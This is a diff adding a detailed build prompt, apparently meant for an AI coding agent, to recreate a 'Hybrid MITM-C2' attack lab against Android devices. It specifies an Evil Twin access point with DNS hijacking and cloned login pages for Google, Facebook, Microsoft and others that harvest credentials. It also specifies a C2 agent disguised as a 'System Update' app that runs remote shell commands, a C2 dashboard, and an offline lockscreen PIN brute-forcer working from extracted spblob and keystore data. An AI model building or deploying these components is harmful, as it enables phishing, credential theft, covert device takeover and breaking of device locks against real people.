@@ -1,0 +1,524 @@
+================================================================================
+PROMPT: Build Complete Hybrid MITM-C2 Offensive Security Lab
+================================================================================
+
+TASK: Reproduce the entire "Hybrid MITM-C2" project from scratch. This is an
+offensive security lab that simulates an end-to-end Evil Twin + Credential
+Farming + C2 Remote Control attack against Android devices. Build ALL components
+below in order. Use Python 3, PHP, Java (Android), Bash, and YAML.
+
+================================================================================
+ARCHITECTURE OVERVIEW
+================================================================================
+
+The attack flow is:
+  1. WEF Evil Twin creates a Rogue AP (hostapd + dnsmasq + lighttpd on :80)
+  2. DNS redirect sends all victim traffic to the captive portal (PHP)
+  3. Victim enters credentials on phishing page → post.php saves to file
+     + shared creds.jsonl + modal popup appears
+  4. Popup says "System Update Required" → victim downloads APK
+  5. Victim installs "System Update" app → taps "START AGENT"
+  6. C2 Agent auto-detects gateway IP via WiFi DHCP, beacons to :80/beacon.php
+  7. beacon.php proxies POST to dashboard :4443 via curl
+  8. Dashboard (Flask :4443) shows creds + agents + sends shell commands
+  9. Command results flow back via :80/results.php → :4443/results
+
+================================================================================
+COMPONENT 1: C2 DASHBOARD SERVER (server/c2_server.py)
+================================================================================
+
+Create a unified Flask dashboard on port 4443 with these features:
+
+- **File:** `server/c2_server.py`
+- **Port:** 4443 (single port for everything)
+- **Dependencies:** flask (`pip install flask`)
+- **Data stores (in-memory dicts):**
+  - `agents = {}` — keyed by agent_id, stores first_seen, device, model, brand,
+    release, network, last_seen, results list
+  - `command_queue = {}` — keyed by agent_id, list of pending "shell:..." commands
+  - `captured_creds = []` — list of credential dicts from shared JSONL file
+
+- **Endpoints:**
+
+  GET `/` or `/admin` — Unified Dashboard HTML page with:
+    - Dark theme (GitHub-style: #0d1117 background, #c9d1d9 text, #58a6ff accents)
+    - Left panel: recent credentials table (last 8) — Time, IP, Fields columns
+    - Right panel: C2 Agents table (last 8) — ID, Device, Ver, Net, Seen, Res,
+      Delete columns
+    - "Send Command" form: agent select dropdown + command text input +
+      "SEND COMMAND" button (supports GET method via /admin?target=X&cmd=shell:...)
+    - Command Results section showing last 3 results per agent
+    - Auto-refresh every 30 seconds via JavaScript setTimeout
+    - localStorage persistence for selected agent and last command
+    - Links: "Full Credentials", "APK Download", "Refresh Now" button
+    - Mobile-responsive CSS grid layout (2 columns on screens >=768px)
+
+  GET `/creds` — Full credential viewer HTML page:
+    - Table with all captured credentials (reversed, last 50)
+    - Time, IP, Fields columns
+    - Back link to Dashboard
+    - Same dark theme
+
+  POST `/beacon` — C2 agent heartbeat endpoint:
+    - Receives form-encoded data: id, device, model, brand, release, sdk, network, gateway
+    - If new agent_id: create agent dict, print "[+] NEW AGENT: ..."
+    - If existing: update last_seen and network
+    - Pop and return pending commands: `{"commands": [...], "interval": 30}`
+    - Print "[BEACON] agent_id... | model"
+
+  POST `/results` — C2 command results endpoint:
+    - Receives form-encoded data: id, output
+    - Appends result dict {time, output[:500]} to agent's results list
+    - Prints "[RESULT] agent_id...: output[:100]"
+    - Returns "OK"
+
+  GET `/delete/<agent_id>` — Delete agent from both agents and command_queue dicts
+    - Redirects back to "/"
+
+  GET `/download` — APK download endpoint:
+    - Checks APK_PATHS list: ["/tmp/c2agent/build/apk/c2agent.apk",
+      "~/Documents/MYPROJECT/TOOLS/hybrid-mitm-c2/c2-lab-agent.apk"]
+    - Returns first existing APK as attachment named "SecurityUpdate.apk"
+    - MIME: application/vnd.android.package-archive
+    - 404 if none found
+
+- **Shared Credential File Watcher (background thread):**
+  - Polls SHARED_CREDS_FILE (default: `WEF/creds.jsonl` relative to script dir)
+  - Every 1 second, reads new lines (JSON Lines format)
+  - Each line is a JSON dict with keys like email_google, password_google, _time,
+    _ip, _ua
+  - Appends parsed entries to captured_creds list
+  - Prints "[!] NEW CREDENTIAL: ..."
+
+- **Main function:**
+  - Touch/create SHARED_CREDS_FILE with permissions 0o666
+  - Print startup banner with all endpoint URLs
+  - Start file watcher thread (daemon=True)
+  - Run Flask app on host='0.0.0.0', port=4443, threaded=True, debug=False
+
+================================================================================
+COMPONENT 2: C2 AGENT ANDROID APK (agent/build/)
+================================================================================
+
+Create a minimal Android APK without Gradle, using aapt2 + javac + d8 directly.
+
+**Package:** com.c2.agent
+**App label:** "System Update" (disguised as legitimate system tool)
+**Min SDK:** 24 (Android 7.0+)
+**Target SDK:** 34
+
+--- FILE: agent/build/AndroidManifest.xml ---
+- Manifest with package="com.c2.agent", versionCode="1", versionName="1.0"
+- Permissions: INTERNET, ACCESS_NETWORK_STATE, ACCESS_WIFI_STATE
+- application: allowBackup=true, label="System Update", supportsRtl=true,
+  theme=@android:style/Theme.Material.Light.NoActionBar,
+  networkSecurityConfig="@xml/network_security_config"
+- Activity: .MainActivity, exported=true, label="System Update", with
+  MAIN/LAUNCHER intent filter
+- Service: .C2Service, exported=false
+
+--- FILE: agent/build/MainActivity.java ---
+- Package: com.c2.agent
+- Extends Activity
+- Fields: TextView statusText, Button startButton, boolean serviceRunning
+- Helper method: int id(String name) — uses getResources().getIdentifier()
+- onCreate():
+  - setContentView using getIdentifier("activity_main", "layout", getPackageName())
+  - Find views by id("statusText"), id("startButton")
+  - On button click:
+    - If not running: startService(new Intent(this, C2Service.class)),
+      set running=true, statusText="Agent Status: ACTIVE - C2 connected",
+      button text="STOP AGENT"
+    - If running: stopService, running=false,
+      statusText="Agent Status: STOPPED", button text="START AGENT"
+
+--- FILE: agent/build/C2Service.java (UNIVERSAL VERSION) ---
+- Package: com.c2.agent
+- Extends Service
+- Static fields: TAG="C2Agent", C2_BEACON, C2_RESULTS (set dynamically),
+  BEACON_INTERVAL=15, running=false
+- ScheduledExecutorService scheduler
+
+- **detectGateway() method:**
+  - Get WifiManager from context
+  - Get DhcpInfo, extract gateway IP as int
+  - Convert int to dotted string: (ip&0xFF) + "." + ((ip>>8)&0xFF) + "." +
+    ((ip>>16)&0xFF) + "." + ((ip>>24)&0xFF)
+  - If gateway is "0.0.0.0" or detection fails, fallback to "10.0.2.2" (emulator)
+  - If ConnectivityManager shows not WiFi, return null (will use fallback)
+
+- **onCreate():**
+  - Call detectGateway(), build C2_BEACON = "http://{gateway}:80/beacon.php"
+  - Build C2_RESULTS = "http://{gateway}:80/results.php"
+  - Set running=true
+  - Log "C2 Gateway: {gateway} | Beacon: {C2_BEACON}"
+  - Create SingleThreadScheduledExecutor, schedule beacon() at fixed rate:
+    2s initial delay, 15s interval
+
+- **onStartCommand():** return START_STICKY (auto-restart if killed)
+- **onBind():** return null
+- **onDestroy():** running=false, shutdown scheduler
+
+- **beacon() method:**
+  - Collect device info via collectDeviceInfo()
+  - HTTP POST to C2_BEACON
+  - Parse response: look for "shell:" strings between quotes (simple JSON parse)
+  - For each command found (indexOf("shell:") loop), call executeCommand()
+
+- **collectDeviceInfo() method:**
+  - Build URL-encoded form string with fields:
+    device=Build.DEVICE, model=Build.MODEL, brand=Build.BRAND,
+    release=Build.VERSION.RELEASE, sdk=Build.VERSION.SDK_INT,
+    id=Settings.Secure.ANDROID_ID,
+    network=activeNetworkInfo.getTypeName() or "NONE",
+    gateway=WiFi DHCP gateway IP
+  - Return as form-encoded string
+
+- **executeCommand(String cmd) method:**
+  - If cmd starts with "shell:": call runShellCommand(cmd.substring(6))
+  - Else: output = "Unknown: " + cmd
+  - POST output to C2_RESULTS with form data: id=ANDROID_ID&output=encoded_output
+
+- **runShellCommand(String cmd) method:**
+  - Runtime.getRuntime().exec(cmd)
+  - Read process stdout via BufferedReader
+  - Wait for process, return trimmed output
+  - On error: return "ERROR: " + e.getMessage()
+
+- **httpPost(String urlStr, String data) method:**
+  - HttpURLConnection, POST method, Content-Type: application/x-www-form-urlencoded
+  - 8 second connect/read timeout
+  - Write data bytes (UTF-8), read response, return as string
+
+- **urlEncode(String s) method:**
+  - URLEncoder.encode(s, "UTF-8") with fallback to raw string
+
+--- FILE: agent/build/C2Service.java.template ---
+- Same as C2Service.java but with `C2_SERVER = "http://C2_HOST:C2_PORT"`
+  (placeholder for sed replacement during build)
+- No gateway detection — uses hardcoded C2_SERVER constant
+
+--- FILE: agent/build/res/layout/activity_main.xml ---
+- LinearLayout vertical, centered, padding 24dp, background #F5F5F5
+- ImageView 80dp x 80dp, src=@android:drawable/ic_menu_manage, marginBottom 16dp
+- TextView "System Update Tool", 22sp bold, color #212121
+- TextView "v1.0.3", 14sp, color #757575, marginBottom 32dp
+- TextView @+id/statusText: "Agent Status: READY", 16sp, color #1976D2,
+  padding 16dp, marginBottom 24dp
+- Button @+id/startButton: "START AGENT", 16sp white, 56dp height,
+  backgroundTint #1976D2, marginBottom 16dp
+- TextView footer: "This application performs system maintenance tasks.",
+  12sp, color #9E9E9E
+
+--- FILE: agent/build/res/values/strings.xml ---
+- String name="app_name": "System Update"
+
+--- FILE: agent/build/res/values/themes.xml ---
+- Style name="Theme.AppCompat.Light.NoActionBar"
+  parent="@android:style/Theme.Material.Light.NoActionBar"
+
+--- FILE: agent/build/res/xml/network_security_config.xml ---
+- network-security-config with base-config cleartextTrafficPermitted="true"
+  and trust-anchors with certificates src="system"
+
+--- FILE: agent/build/build_apk.sh ---
+Bash build script that:
+  1. Takes HOST and PORT as args (default: 10.0.2.2, 4443)
+  2. Replaces C2_HOST:C2_PORT in template → C2Service.java
+  3. [1/6] aapt2 compile: strings.xml, themes.xml, activity_main.xml,
+     network_security_config.xml → resources.zip
+  4. [2/6] aapt2 link: unsigned.apk with android.jar, manifest, resources.zip
+  5. [3/6] javac --release 8 -cp android.jar: MainActivity.java, C2Service.java
+  6. [4/6] d8 --min-api 24: convert .class → classes.dex
+  7. [5/6] zip inject classes.dex into unsigned.apk, then zipalign -p 4
+  8. [6/6] keytool genkey (debug keystore, password: android) + apksigner sign
+  9. Copy to output as c2agent-{HOST}.apk
+
+  Uses: $HOME/Android/Sdk/build-tools/36.1.0 and $HOME/Android/Sdk/platforms/android-36.1
+
+- Pre-built APK: agent/SecurityUpdate.apk (universal, auto-detect gateway)
+
+================================================================================
+COMPONENT 3: PHP PROXY FILES (WEF/)
+================================================================================
+
+These PHP files sit under WEF/ and are served by lighttpd on port 80. They proxy
+traffic between the C2 agent and the Flask dashboard on port 4443.
+
+--- FILE: WEF/beacon.php ---
+- Receives C2 agent POST (form data via $_POST)
+- Converts to HTTP query string: http_build_query($_POST)
+- Uses shell_exec to curl POST to http://127.0.0.1:4443/beacon
+  with escapeshellarg() for safety
+- If result: return as JSON with Content-Type: application/json
+- If no result: return '{"commands":[],"interval":30}'
+- Timeout: 3 seconds connect timeout on curl
+
+--- FILE: WEF/results.php ---
+- Receives C2 agent POST (form data via $_POST)
+- Forwards to http://127.0.0.1:4443/results via backgrounded curl
+- Uses shell_exec with `>/dev/null 2>&1 &` (fire-and-forget)
+- Returns "OK"
+
+================================================================================
+COMPONENT 4: WEF EVIL TWIN + PHISHING TEMPLATES (WEF/)
+================================================================================
+
+--- WEF Framework ---
+- WEF v1.6 (WiFi Exploitation Framework) — main executable: WEF/wef
+- Provides interactive menu for Evil Twin attacks
+- Uses hostapd for Rogue AP, dnsmasq for DHCP/DNS (IP range: 10.0.221.2-30,
+  gateway: 10.0.221.1), lighttpd for captive portal web server
+- DNS: address=/#/10.0.221.1 (redirects ALL domains to AP gateway)
+- DHCP options: router=10.0.221.1, DNS=10.0.221.1
+- lighttpd: port 80, server.error-handler-404 = "/" (captive portal redirect)
+- Template selection menu with 14+ phishing templates
+
+--- Phishing Templates (WEF/templates_fake/) ---
+Each template directory contains:
+  - index.php — phishing login page (HTML/CSS mimicking real site)
+  - post.php — form handler that saves credentials
+  - Assets (CSS, images, fonts)
+
+Templates required (12+):
+  1. **facebook/** — Email/Phone + Password → POST to post.php
+  2. **google/** — email_google + password_google fields, Google sign-in UI
+  3. **twitter/** — Twitter login clone
+  4. **instagram/** — Instagram login clone
+  5. **yahoo/** — Yahoo login clone
+  6. **linkedin/** — LinkedIn login clone
+  7. **microsoft/** — Microsoft/Outlook login clone
+  8. **netflix/** — Netflix login clone
+  9. **snapchat/** — Snapchat login clone
+  10. **spotify/** — Spotify login clone
+  11. **dropbox/** — Dropbox login clone
+  12. **wifi/** — Generic WiFi password capture
+  13. **starbucks/** — Starbucks WiFi login clone
+  14. **wifiid/** — ISP-branded multi-login (Google/Facebook/Instagram/Twitter
+      sub-templates with APK download)
+
+--- Each template's post.php handler must: ---
+  1. Capture all $_POST fields
+  2. Save to `datos-privados.txt` in parent directory (FILE_APPEND)
+  3. Write to shared `creds.jsonl` file (JSON Lines format, each entry on one line)
+     - Add _time (HH:MM:SS), _ip (REMOTE_ADDR), _ua (User-Agent) metadata
+  4. Display inline modal popup: "System Update Required" with "INSTALL UPDATE"
+     button linking to /update.php or /download for the APK
+  5. Use correct relative paths for crends.jsonl location
+     (../../creds.jsonl for templates 2 levels deep)
+
+================================================================================
+COMPONENT 5: MAESTRO UI AUTOMATION FLOWS (flows/)
+================================================================================
+
+--- FILE: flows/full-attack-flow.yaml ---
+Maestro YAML flow for automated captive portal testing:
+  - name: full-attack-portal-capture
+  - appId: com.android.chrome
+  - Steps:
+    1. openLink: "http://10.0.2.2/" (captive portal)
+    2. extendedWaitUntil: visible text matching "Log In|Connect|Sign|Email|Password"
+       (timeout 10s)
+    3. Tap email field (try id="email_google" or text="Email"), inputText:
+       "victim@example.com"
+    4. Tap password field (try id="password_google" or text="Password"),
+       inputText: "P@ssw0rd123!"
+    5. Tap submit button matching "Log In|Login|Sign In|Connect|Masuk|Next|Submit"
+    6. extendedWaitUntil: visible text matching "Security Update|Install|Download"
+       (timeout 10s)
+    7. Tap "Install|Download|Update"
+    8. Take screenshots at each step (step01 through step06)
+
+--- FILE: flows/agent-activate.yaml ---
+Maestro YAML flow for C2 agent activation:
+  - name: agent-activate
+  - appId: com.c2.agent
+  - Steps:
+    1. launchApp
+    2. extendedWaitUntil: visible text matching "START|AGENT|Status" (timeout 5s)
+    3. Tap button matching "START|Activate"
+    4. extendedWaitUntil: visible text matching "ACTIVE|STOP|Connected" (timeout 8s)
+    5. Take screenshots at each step
+
+================================================================================
+COMPONENT 6: ORCHESTRATION SCRIPT (scripts/run_full_attack.sh)
+================================================================================
+
+--- FILE: scripts/run_full_attack.sh ---
+Bash script that orchestrates the full attack:
+  1. CHECK prerequisites: adb devices shows emulator, APK exists
+  2. STEP 1: Kill any existing c2_server.py, start dashboard in background,
+     wait 2s, verify PID
+  3. STEP 2: Run Maestro full-attack-flow.yaml (prompt user if WEF is running)
+  4. STEP 3: adb install -r the C2 agent APK
+  5. STEP 4: Run Maestro agent-activate.yaml (or fallback to adb shell am start
+     + adb shell input tap)
+  6. Print success message with all URLs and dashboard PID
+
+================================================================================
+COMPONENT 7: OFFLINE ANDROID SP BLOB PIN BRUTE-FORCE (scripts/)
+================================================================================
+
+--- FILE: scripts/extract_params.py ---
+Python script to extract brute-force parameters from Android 14 device:
+  - Parse .pwd file (protobuf): extract salt (16 bytes), scrypt params (N, r, p)
+  - Parse .secdis file: SHA-512 hash of 16KB secdiscardable data
+  - Parse .spblob file: extract version byte, outer IV (12 bytes), ciphertext+tag
+  - Parse persistent.sqlite (keystore DB):
+    - Join keyentry + blobentry tables
+    - Look for alias containing "synthetic_password"
+    - Extract master key (first 32 bytes of blob)
+  - ADB auto-pull mode: pulls files from /data/system_de/0/spblob/{protector_id}.*
+  - Output: params.json with all extracted data
+  - CLI args: --adb, --pwd, --spblob, --secdis, --keystore-db, --protector-id,
+    --output
+
+--- FILE: scripts/gpu_brute.py ---
+Multi-process GPU-optimized PIN brute-forcer:
+  - Architecture:
+    PIN → scrypt(N, r, p, salt) → stretchedLskf (32B)
+    stretchedLskf + secdis_hash → protectorSecret (96B)
+    SHA512(pad128("application-id") || protectorSecret)[:32] → inner AES key
+    AES-GCM decrypt inner layer → tag match = correct PIN
+  - Pre-compute: outer layer decrypted once with keystore master key
+  - ProcessPoolExecutor for parallel brute-force
+  - Checkpoint resume support (checkpoint_{length}.txt)
+  - Progress display: percentage, rate (PIN/s), ETA
+  - CLI args: --params, -L (min PIN len), -M (max), -w (workers), --start, --end,
+    --resume, --pin (single test)
+
+--- FILE: scripts/decrypt_outer.py ---
+On-device SP blob outer layer decryption helper:
+  - Attempts to use LockSettingsService via ADB
+  - Notes that offline decryption is not possible without TEE exploit
+  - Recommends using on-device TEE unwrap via Java APK
+
+================================================================================
+COMPONENT 8: EgnakeRAT ARCHIVE (archive/)
+================================================================================
+
+Reference implementation of a more advanced Android RAT (Remote Access Tool):
+  - TCP-based C2 (not HTTP like the custom agent)
+  - AES-256-CBC encrypted communication
+  - Python C2 server + WebSocket dashboard
+  - ngrok tunnel support
+  - 40+ commands (shell, camera, keylogger, etc.)
+  - Gradle-based APK build (Android_Code/)
+  - Database for persistence (EgnakeRAT.db)
+
+================================================================================
+COMPONENT 9: DOCUMENTATION (docs/)
+================================================================================
+
+--- FILE: docs/setup.md ---
+Detailed setup guide covering:
+  - Hardware prerequisites (WiFi adapter with monitor mode + AP mode)
+  - System dependency installation (lighttpd, php-cgi, adb, apksigner, etc.)
+  - WiFi adapter verification (iw list, airmon-ng)
+  - Android emulator setup (AVD with writable system)
+  - Maestro installation (curl from get.maestro.mobile.dev)
+  - WEF configuration
+  - Dashboard test instructions
+  - WEF Evil Twin test instructions
+  - Full flow test instructions
+  - Cleanup procedures
+  - Notes about hardcoded IPs and universal APK
+
+--- FILE: docs/skill.md ---
+Quick reference with:
+  - Evil Twin attack commands and menu flow
+  - C2 dashboard startup
+  - Key files modified in WEF (table)
+  - C2 command reference (shell:id, shell:whoami, shell:ls, etc.)
+  - ADB commands (install, uninstall, logcat, etc.)
+  - Maestro commands (test, studio)
+  - Manual APK build commands
+  - Troubleshooting table (symptoms, causes, fixes)
+  - Credential file format (JSONL)
+  - APK gateway detection logic (Java code snippet)
+
+--- FILE: docs/OFFSEC-LAB-COMPLETE.md ---
+Original complete documentation (refer to existing file for full content).
+Contains: architecture diagrams, full source code listings, step-by-step
+execution guide, test results, troubleshooting.
+
+--- FILE: README.md ---
+Project root README with:
+  - Title and description
+  - Tools & requirements table
+  - Architecture ASCII diagram
+  - Quick start instructions
+  - Directory structure
+  - C2 Agent feature table
+  - Dashboard endpoints table
+  - Phishing templates table
+  - Testing instructions (emulator + physical device)
+  - License notice (educational purposes only)
+
+================================================================================
+CRITICAL REQUIREMENTS (DO NOT MISS ANY)
+================================================================================
+
+1. **The APK MUST use universal gateway auto-detection** via WifiManager.getDhcpInfo().
+   Fallback to 10.0.2.2 when not on WiFi (emulator). The C2_BEACON and
+   C2_RESULTS URLs must be built dynamically in onCreate() on port 80 with /beacon.php
+   and /results.php paths.
+
+2. **All PHP template handlers (post.php) MUST:**
+   - Save to `datos-privados.txt` (local, FILE_APPEND)
+   - Also write JSONL entry to shared `creds.jsonl` with _time, _ip, _ua fields
+   - Include inline modal popup for APK download
+   - Use correct relative paths
+
+3. **The Flask dashboard MUST:**
+   - Have a background thread polling the shared JSONL creds file every 1 second
+   - Track file position (f.seek/f.tell) to only read new lines
+   - Use the SHARED_CREDS_FILE path: os.path.join(script_dir, "WEF", "creds.jsonl")
+
+4. **PHP proxy files (beacon.php, results.php):**
+   - Use shell_exec() with curl to forward traffic to localhost:4443
+   - Properly escape arguments with escapeshellarg()
+   - beacon.php MUST return valid JSON response
+
+5. **The build_apk.sh script MUST:**
+   - Process in this exact order: compile resources → link APK → compile Java →
+     DEX → inject DEX → zipalign → sign
+   - zipalign BEFORE apksigner (not after, to avoid "Package corrupted" error)
+
+6. **All HTML must use inline CSS** (dark theme), no external stylesheets for
+   the dashboard.
+
+7. **Maestro flows must use optional: true on field selectors** to handle
+   different template structures.
+
+8. **The orchestrator script must handle:**
+   - Checking prerequisites (adb, APK file)
+   - Background dashboard startup with PID tracking
+   - Graceful fallback if Maestro fails (manual ADB activation)
+
+9. **The SP blob PIN brute-force must implement:**
+   - Correct scrypt parameters (N=2048, r=8, p=2 default)
+   - pad128() for "application-id" string
+   - AES-GCM with empty AAD
+   - Multi-process parallelism
+   - Checkpoint resume
+
+================================================================================
+TECHNOLOGY STACK SUMMARY
+================================================================================
+
+  - Python 3.11+ with Flask (pip install flask)
+  - PHP-CGI 8.4+ (system package)
+  - lighttpd 1.4.x (system package)
+  - Android SDK 36.1 (aapt2, d8, apksigner, zipalign)
+  - JDK 17-21 (javac)
+  - ADB (Android Debug Bridge)
+  - Maestro (UI automation, installed via curl)
+  - Bash (orchestration scripts)
+  - YAML (Maestro flow definitions)
+  - Java (Android agent source, compiled with --release 8)
+  - WiFi adapter with monitor mode + AP mode support
+
+================================================================================
+END OF PROMPT
+================================================================================
